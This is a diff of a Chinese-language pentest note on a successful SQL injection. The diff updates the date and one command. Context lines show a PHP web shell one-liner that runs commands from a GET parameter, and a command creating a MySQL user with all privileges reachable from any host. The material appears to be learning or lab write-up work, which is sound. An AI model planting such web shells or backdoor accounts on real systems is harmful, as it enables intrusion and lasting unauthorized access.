@@ -2,7 +2,7 @@
 title: SQL Injection dce Success
 description: SQL Injection dce Success
 last_update:
-  date: "2025-09-03T08:00:00+08:00"
+  date: "2025-09-06T08:00:00+08:00"
 ---
 
 ## 前言
@@ -83,7 +83,7 @@ UNION 前後的欄位數量還是得匹配，才會成功執行
 
 12. 也可以用 `<?php echo exec($_GET[cmd]);?>`
 
-13. 直接用 CMD 新增 MySQL 使用者: `D:\xampp\mysql\bin\mysql.exe -u root -p"password" -e "CREATE USER 'tempdump'@'%' IDENTIFIED BY 'temp_password'; GRANT ALL ON *.* TO 'tempdump'@'%';"`
+13. 直接用 CMD 新增 MySQL 使用者: `D:\xampp\mysql\bin\mysql.exe -u root -p"password" -e "CREATE USER 'tempdump'@'%' IDENTIFIED BY 'temp_password'; GRANT ALL ON *.* TO 'tempdump'@'%'; FLUSH PRIVILEGES;"`
 
 - 要記得 -p 後面不能有空格，這樣才不會跳出輸入框
 - `-e "SQL Syntax Here; Other SQL Syntax Here;"`
